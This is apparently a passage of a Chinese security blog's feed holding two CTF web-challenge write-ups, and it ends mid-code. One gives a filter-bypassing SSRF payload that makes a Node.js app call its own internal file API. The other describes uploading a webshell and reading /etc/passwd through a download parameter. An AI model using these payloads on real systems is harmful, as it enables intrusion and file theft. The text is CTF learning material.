class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word ğŸ¤¬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved ğŸ¤‘ You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf ğŸ˜¥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>contentè¢«è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ç¬¦ï¼Œå¦‚æœé€šè¿‡è¿‡æ»¤å°±ä¼šåœ¨<code>/files</code>ä¸‹ç”Ÿæˆä¸€ä¸ªpdfæ–‡ä»¶ï¼ŒDB-&gt;create()å‡½æ•°ä¸­çš„insertè¯­å¥å’Œä¸Šé¢superuserç”Ÿæˆflagæ–‡ä»¶çš„è¯­å¥ä¸€è‡´ï¼Œå¯æ¨æµ‹flagæ–‡ä»¶å°±æ˜¯åœ¨<code>/files</code>è·¯ç”±ä¸‹</p><p>ç°åœ¨å°±æ˜¯è¦æƒ³åŠæ³•æŸ¥çœ‹è¿™ä¸ªflagæ–‡ä»¶ï¼Œçœ‹çœ‹å‰©ä¸‹çš„ä»£ç </p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// You can also add file logs here!</span></span><br><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/api/files/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.signedCookies[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> (token &amp;&amp; token[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (token.username == <span class="string">&#x27;superuser&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Superuser is disabled now&#x27;</span>);   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> filename = <span class="keyword">await</span> DB.getFile(token.username, req.params.id)</span><br><span class="line">            <span class="keyword">if</span> (fs.existsSync(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)))&#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="keyword">await</span> readFile(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="string">&#x27;No such file!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>/api/files</code>è·¯ç”±ä¼šbanæ‰é127.0.0.1çš„è®¿é—®ï¼Œé€šè¿‡è¿‡æ»¤ä¹Ÿèƒ½ç»™usernameç”¨æˆ·æ·»åŠ æ–‡ä»¶ï¼Œæ¥ç€æ˜¯<code>api/files/:id</code>ï¼Œé€šè¿‡DB-&gt;getFile()å®ç°äº†ä¸€ä¸ªæŸ¥çœ‹<code>/files</code>è·¯ç”±ä¸‹æ–‡ä»¶çš„åŠŸèƒ½ï¼Œé€šè¿‡è¯¥å‡½æ•°è¯»å–æ–‡ä»¶ï¼Œéœ€è¦æ–‡ä»¶åä»¥åŠå¯¹åº”çš„checksum(ä¹Ÿå°±æ˜¯è·¯ç”±ä¸­çš„id)</p><p>è¿™é“é¢˜çš„æ¼æ´åœ¨äºï¼Œflagæ–‡ä»¶æ˜¯å‚¨å­˜åœ¨<code>/files</code>è·¯ç”±ä¸‹çš„ï¼Œå¹¶ä¸”checksumä¸æ˜¯æ‰€æœ‰ç”¨æˆ·å…±äº«çš„ï¼Œè€Œæ•°æ®åº“ä¸­å­˜å‚¨çš„æ˜¯ç”¨æˆ·åï¼Œæ–‡ä»¶åå’Œè¯¥ç”¨æˆ·è´¦å·ä¸­æ–‡ä»¶çš„checksumï¼Œè™½ç„¶superuseræ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯å¯ä»¥æŠŠå±äºsuperuserçš„flagæ–‡ä»¶åå’Œè‡ªå®šä¹‰çš„checksumæ·»åŠ åˆ°adminè´¦å·é‡Œé¢ï¼Œç„¶åç”¨adminè´¦å·æ¥è®¿é—®flag</p><p>contentçš„è¿‡æ»¤ä½¿ç”¨includes()å‡½æ•°ï¼Œå¯ç”¨æ•°ç»„ç»•è¿‡ï¼Œåœ¨app.tsä¸­æåˆ°ï¼Œç›‘å¬çš„ç«¯å£ä¸º8888ï¼Œç”¨<code>&lt;img src=&quot;&quot;&gt;</code>è§¦å‘ssrfï¼Œpayloadä¸ºï¼š</p><p><code>content[]=&lt;img src=&quot;http://127.0.0.1:8888/api/files/?username=admin&amp;filename=./flag&amp;checksum=123&quot;&gt;</code></p><p>æœ€å¥½urlç¼–ç ä¸€æ¬¡<code>content%5B%5D%3D%3Cimg%20src%3D%22http%3A//127.0.0.1%3A8888/api/files/%3Fusername%3Dadmin%26filename%3D./flag%26checksum%3D123%22%3E</code></p><p>postä¼ é€’payloadï¼Œå†è®¿é—®<code>/api/files/123</code>å³å¯ä¸‹è½½flagæ–‡ä»¶</p><p><img src="/2022/02/09/secrets-of-admin/image-20220209185442890.png" alt="image-20220209185442890"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ç™»å½•ç•Œé¢æç¤ºä»¥adminèº«ä»½ç™»å½•&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/09/secrets-of-admin/image-20220209143402636.png&quot; alt=&quot;image-20220209143402636&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹è½½é™„ä»¶&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019ååŒ—èµ›åŒºDay1Web1-Dropbox</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/</id>
    <published>2022-01-23T09:10:54.000Z</published>
    <updated>2022-01-24T07:27:03.455Z</updated>
    
    <content type="html"><![CDATA[<p>æ³¨å†Œè´¦å·ï¼Œç™»å½•ï¼Œè¿›å…¥ä¸€ä¸ªç½‘ç›˜ç®¡ç†é¡µé¢ï¼Œå…è®¸è¿›è¡Œ<code>jpg/png/gif</code>æ–‡ä»¶çš„ä¸Šä¼ å’Œä¸‹è½½ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ç„¶åæŠ“åŒ…ï¼Œç»•è¿‡<code>Content-Type</code>éªŒè¯ï¼Œå³å¯åœ¨åˆ—è¡¨ä¸­çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123213022231.png" alt="image-20220123213022231"></p><p>è¿™é‡Œæ²¡æœ‰ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ï¼Œèšå‰‘æ˜¯è¿æ¥ä¸äº†çš„ï¼Œä½†å…³é”®åœ¨äºå®ƒæä¾›çš„æ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼Œè¿™é‡Œä¸‹è½½æ–‡ä»¶å¹¶æŠ“åŒ…</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123221215369.png" alt="image-20220123221215369"></p><p>å¯ä»¥çœ‹è§è¦ä¸‹è½½çš„æ–‡ä»¶åå°±æ˜¯å˜é‡<code>filename</code>çš„å€¼ï¼Œå¹¶ä¸”å°†æŠ¥æ–‡å‘é€ä¹‹åå°±å¯ä»¥å¾—åˆ°æ–‡ä»¶å†…å®¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ¨æµ‹èƒ½é€šè¿‡ä¿®æ”¹å®ƒçš„å€¼ï¼Œæ¥å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶çš„å…·ä½“å†…å®¹ï¼Œå…ˆéªŒè¯ä¸€ä¸‹ï¼ŒæŸ¥çœ‹ç³»ç»Ÿæ–‡ä»¶<code>/etc/passwd</code></p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123214632853.png" alt="image-20220123214632853"></p><p>æˆåŠŸå¾—åˆ°passwdæ–‡ä»¶çš„å†…å®¹ï¼Œç°åœ¨å°è¯•ç›´æ¥æŸ¥çœ‹flagæ–‡ä»¶</p><p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123215052845.png" alt="image-20220123215052845"></p><p>æ˜¾ç¤ºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåº”è¯¥æ˜¯æ— æ³•é€šè¿‡è¿™ç§æ–¹å¼ç›´æ¥å¾—åˆ°flagäº†ï¼Œè¿™é‡Œå…ˆæŠŠå…¶å®ƒå¯èƒ½æœ‰ç”¨çš„æ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥</p><p><strong>download.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>) &amp;&amp; stristr(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    Header(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . basename(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§å¯¹ä»»æ„æ–‡ä»¶åä¸­å«æœ‰<code>flag</code>çš„æ–‡ä»¶ï¼Œæƒ³è¦æŸ¥çœ‹éƒ½ä¼šå›æ˜¾<code>File not exist</code>ï¼Œè¿™é‡Œå…¶å®ä¹Ÿæ˜¯åœ¨æç¤ºflagæ‰€åœ¨çš„æ–‡ä»¶å</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤ä¸ªæ–‡ä»¶ä¸­å‡å¼•ç”¨äº†<strong>class.php</strong>æ–‡ä»¶ï¼Œæ¨æµ‹è¿™åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªå…³é”®æ–‡ä»¶ï¼Œä»¥åŒæ ·çš„æ–¹å¼æŸ¥çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = 